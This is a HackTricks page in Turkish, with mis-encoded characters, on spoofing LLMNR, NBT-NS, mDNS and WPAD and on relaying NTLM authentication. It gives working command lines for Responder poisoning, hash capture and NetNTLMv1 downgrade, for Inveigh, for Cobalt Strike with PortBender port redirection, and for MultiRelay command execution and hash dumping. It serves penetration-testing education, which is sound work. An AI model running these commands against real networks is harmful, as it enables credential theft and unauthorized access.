# LLMNR, NBT-NS, mDNS/DNS ve WPAD SahteciliÄŸi ve Ä°letim SaldÄ±rÄ±larÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'da takip edin.
* Hacking hilelerinizi gÃ¶ndererek **HackTricks** ve **HackTricks Cloud** github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## AÄŸ Protokolleri

### Yerel Ana Bilgisayar Ã‡Ã¶zÃ¼mleme Protokolleri
- **LLMNR, NBT-NS ve mDNS**:
- Microsoft ve diÄŸer iÅŸletim sistemleri, DNS baÅŸarÄ±sÄ±z olduÄŸunda yerel ad Ã§Ã¶zÃ¼mlemesi iÃ§in LLMNR ve NBT-NS kullanÄ±r. Benzer ÅŸekilde, Apple ve Linux sistemleri mDNS kullanÄ±r.
- Bu protokoller, kimlik doÄŸrulama yapÄ±lmayan, UDP Ã¼zerinden yayÄ±n yapan doÄŸasÄ± nedeniyle dinleme ve sahteciliÄŸe karÅŸÄ± savunmasÄ±zdÄ±r.
- [Responder](https://github.com/lgandx/Responder), bu protokolleri sorgulayan ana bilgisayarlara sahte yanÄ±tlar gÃ¶ndererek hizmetleri taklit etmek iÃ§in kullanÄ±labilir.
- Responder kullanarak hizmet taklit etme hakkÄ±nda daha fazla bilgiye [buradan](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) ulaÅŸabilirsiniz.

### Web Proxy Auto-Discovery Protocol (WPAD)
- WPAD, tarayÄ±cÄ±larÄ±n proxy ayarlarÄ±nÄ± otomatik olarak keÅŸfetmelerine olanak tanÄ±r.
- KeÅŸif, DHCP, DNS veya DNS baÅŸarÄ±sÄ±z olursa LLMNR ve NBT-NS'ye geri dÃ¼ÅŸme yoluyla kolaylaÅŸtÄ±rÄ±lÄ±r.
- Responder, WPAD saldÄ±rÄ±larÄ±nÄ± otomatikleÅŸtirebilir ve istemcileri kÃ¶tÃ¼ niyetli WPAD sunucularÄ±na yÃ¶nlendirebilir.

### Protokol Zehirleme iÃ§in Responder
- **Responder**, LLMNR, NBT-NS ve mDNS sorgularÄ±nÄ± zehirlemek iÃ§in kullanÄ±lan bir araÃ§tÄ±r ve sorgu tÃ¼rlerine gÃ¶re seÃ§ici yanÄ±tlar vererek Ã¶ncelikle SMB hizmetlerini hedef alÄ±r.
- Kali Linux'ta Ã¶nceden yÃ¼klenmiÅŸ olarak gelir ve `/etc/responder/Responder.conf` dosyasÄ±ndan yapÄ±landÄ±rÄ±labilir.
- Responder, yakalanan karmaÅŸalarÄ± ekranda gÃ¶rÃ¼ntÃ¼ler ve `/usr/share/responder/logs` dizininde kaydeder.
- IPv4 ve IPv6'yÄ± destekler.
- Responder'Ä±n Windows sÃ¼rÃ¼mÃ¼ [burada](https://github.com/lgandx/Responder-Windows) bulunabilir.

#### Responder'Ä± Ã‡alÄ±ÅŸtÄ±rma
- VarsayÄ±lan ayarlarla Responder'Ä± Ã§alÄ±ÅŸtÄ±rmak iÃ§in: `responder -I <ArayÃ¼z>`
- Daha agresif keÅŸif iÃ§in (potansiyel yan etkilerle): `responder -I <ArayÃ¼z> -P -r -v`
- NTLMv1 meydan okumalarÄ±nÄ±/yanÄ±tlarÄ±nÄ± daha kolay kÄ±rabilmek iÃ§in teknikler: `responder -I <ArayÃ¼z> --lm --disable-ess`
- WPAD taklitini etkinleÅŸtirmek iÃ§in: `responder -I <ArayÃ¼z> --wpad`
- NetBIOS istekleri saldÄ±rganÄ±n IP'sine Ã§Ã¶zÃ¼mlenebilir ve kimlik doÄŸrulama proxy'si kurulabilir: `responder.py -I <arayÃ¼z> -Pv`

### Responder ile DHCP Zehirleme
- DHCP yanÄ±tlarÄ±nÄ± sahtecilik yaparak bir kurbanÄ±n yÃ¶nlendirme bilgilerini kalÄ±cÄ± olarak zehirleyebilir ve ARP zehirlemeye gÃ¶re daha gizli bir alternatif sunar.
- Hedef aÄŸÄ±n yapÄ±landÄ±rmasÄ± hakkÄ±nda kesin bilgi gerektirir.
- SaldÄ±rÄ±yÄ± Ã§alÄ±ÅŸtÄ±rma: `./Responder.py -I eth0 -Pdv`
- Bu yÃ¶ntem, etkili bir ÅŸekilde NTLMv1/2 karmaÅŸalarÄ±nÄ± yakalayabilir, ancak aÄŸ kesintisini Ã¶nlemek iÃ§in dikkatli bir ÅŸekilde kullanÄ±lmalÄ±dÄ±r.

### Responder ile Kimlik Bilgilerini Yakalama
- Responder, yukarÄ±da bahsedilen protokolleri kullanarak hizmetleri taklit eder ve bir kullanÄ±cÄ± sahte hizmetlere kimlik doÄŸrulama yapmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda kimlik bilgilerini (genellikle NTLMv2 Meydan Okuma/YanÄ±tÄ±) yakalar.
- Kimlik bilgileri kÄ±rÄ±lmasÄ± daha kolay olmasÄ± iÃ§in NetNTLMv1'e dÃ¼ÅŸÃ¼rme veya ESS'yi devre dÄ±ÅŸÄ± bÄ±rakma giriÅŸimleri yapÄ±labilir.

Bu tekniklerin yasal ve etik olarak kullanÄ±lmasÄ±, uygun yetkilendirme saÄŸlanmasÄ± ve aÄŸa zarar verme veya izinsiz eriÅŸimden kaÃ§Ä±nÄ±lmasÄ± Ã¶nemlidir.

## Inveigh

Inveigh, Windows sistemler iÃ§in tasarlanmÄ±ÅŸ bir penetrasyon testi ve kÄ±rmÄ±zÄ± takÄ±m aracÄ±dÄ±r. Responder'a benzer iÅŸlevler sunar ve sahtecilik ve orta adam saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirir. AraÃ§, bir PowerShell komut dosyasÄ±ndan C# ikili bir dosyaya evrim geÃ§irmiÅŸtir ve [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) ve [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) ana sÃ¼rÃ¼mleri bulunmaktadÄ±r. AyrÄ±ntÄ±lÄ± parametreler ve talimatlar [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)'de bulunabilir.

Inveigh, PowerShell aracÄ±lÄ±ÄŸÄ±yla Ã§alÄ±ÅŸtÄ±rÄ±labilir:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Veya bir C# ikili olarak yÃ¼rÃ¼tÃ¼lÃ¼r:
```bash
Inveigh.exe
```
### NTLM Relay SaldÄ±rÄ±sÄ±

Bu saldÄ±rÄ±, bir hedef makineye eriÅŸmek iÃ§in SMB kimlik doÄŸrulama oturumlarÄ±nÄ± kullanÄ±r ve baÅŸarÄ±lÄ± olmasÄ± durumunda bir sistem kabuÄŸu saÄŸlar. Ana gereksinimler ÅŸunlarÄ± iÃ§erir:
- Kimlik doÄŸrulayan kullanÄ±cÄ±nÄ±n, iletilen ana bilgisayarda Yerel YÃ¶netici eriÅŸimine sahip olmasÄ± gerekmektedir.
- SMB imzalama devre dÄ±ÅŸÄ± bÄ±rakÄ±lmalÄ±dÄ±r.

#### 445 Port YÃ¶nlendirme ve TÃ¼nelleme

DoÄŸrudan aÄŸ tanÄ±tÄ±mÄ±nÄ±n mÃ¼mkÃ¼n olmadÄ±ÄŸÄ± senaryolarda, 445 numaralÄ± port Ã¼zerindeki trafiÄŸin yÃ¶nlendirilmesi ve tÃ¼nellemesi gerekmektedir. [**PortBender**](https://github.com/praetorian-inc/PortBender) gibi araÃ§lar, 445 numaralÄ± port trafiÄŸini baÅŸka bir porta yÃ¶nlendirmede yardÄ±mcÄ± olur ve yerel yÃ¶netici eriÅŸimi sÃ¼rÃ¼cÃ¼ yÃ¼kleme iÃ§in mevcut olduÄŸunda Ã¶nemlidir.

Cobalt Strike'da PortBender kurulumu ve iÅŸletimi:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### NTLM Relay SaldÄ±rÄ±sÄ± iÃ§in DiÄŸer AraÃ§lar

- **Metasploit**: Proxy'ler, yerel ve uzak ana bilgisayar ayrÄ±ntÄ±larÄ±yla yapÄ±landÄ±rÄ±lÄ±r.
- **smbrelayx**: SMB oturumlarÄ±nÄ± iletmek ve komutlarÄ± yÃ¼rÃ¼tmek veya arka kapÄ±lar daÄŸÄ±tmak iÃ§in Python betiÄŸi.
- **MultiRelay**: Belirli kullanÄ±cÄ±larÄ± veya tÃ¼m kullanÄ±cÄ±larÄ± iletmek, komutlarÄ± yÃ¼rÃ¼tmek veya hash'leri dÃ¶kmek iÃ§in Responder paketinin bir aracÄ±.

Her bir araÃ§, gerektiÄŸinde SOCKS proxy Ã¼zerinden Ã§alÄ±ÅŸacak ÅŸekilde yapÄ±landÄ±rÄ±labilir, bÃ¶ylece dolaylÄ± aÄŸ eriÅŸimi ile bile saldÄ±rÄ±lar gerÃ§ekleÅŸtirilebilir.

### MultiRelay Ä°ÅŸleyiÅŸi

MultiRelay, _**/usr/share/responder/tools**_ dizininden belirli IP'ler veya kullanÄ±cÄ±lar hedef alÄ±narak Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Bu araÃ§lar ve teknikler, Ã§eÅŸitli aÄŸ ortamlarÄ±nda NTLM Relay saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in kapsamlÄ± bir set oluÅŸturur.

### NTLM Oturumu Zorlama

Windows'ta, bazÄ± ayrÄ±calÄ±klÄ± hesaplarÄ± **keyfi makinelerde kimlik doÄŸrulamaya zorlayabilirsiniz**. NasÄ±l yapÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenmek iÃ§in aÅŸaÄŸÄ±daki sayfayÄ± okuyun:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Referanslar
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
